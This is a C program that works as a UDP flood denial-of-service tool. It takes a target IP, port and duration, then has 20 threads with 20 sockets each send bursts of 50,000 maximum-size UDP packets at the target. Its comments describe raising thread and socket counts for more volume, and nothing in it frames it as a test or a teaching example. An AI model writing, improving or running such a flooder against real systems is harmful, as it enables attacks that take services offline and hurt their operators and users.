#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PACKET_SIZE 65507  // Maximum UDP packet size
#define BURST_SIZE 50000  // Increased number of packets per burst per thread
#define NUM_THREADS 20  // Increased number of threads for parallel sending
#define MAX_SOCKETS 20  // Increased number of sockets per thread

struct thread_data {
    char *target_ip;
    int target_port;
    int duration;  // Duration in seconds
};

void *send_burst(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sockfds[MAX_SOCKETS];
    struct sockaddr_in serverAddr;

    // Create multiple sockets
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sockfds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfds[i] < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(data->target_port);
        serverAddr.sin_addr.s_addr = inet_addr(data->target_ip);
    }

    char buffer[MAX_PACKET_SIZE];
    memset(buffer, 'A', sizeof(buffer));  // Fill buffer with arbitrary data

    time_t start_time = time(NULL);
    while (1) {  // Loop until the specified duration is reached
        for (int j = 0; j < MAX_SOCKETS; j++) {
            for (int i = 0; i < BURST_SIZE; i++) {
                sendto(sockfds[j], buffer, sizeof(buffer), 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            }
        }
        if (time(NULL) - start_time >= data->duration) {
            break;
        }
    }

    // Close all sockets
    for (int i = 0; i < MAX_SOCKETS; i++) {
        close(sockfds[i]);
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_IP> <target_port> <duration>\n", argv[0]);
        return 1;
    }

    struct thread_data data;
    data.target_ip = argv[1];
    data.target_port = atoi(argv[2]);
    data.duration = atoi(argv[3]);  // Set the duration

    pthread_t threads[NUM_THREADS];

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_burst, (void*)&data) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}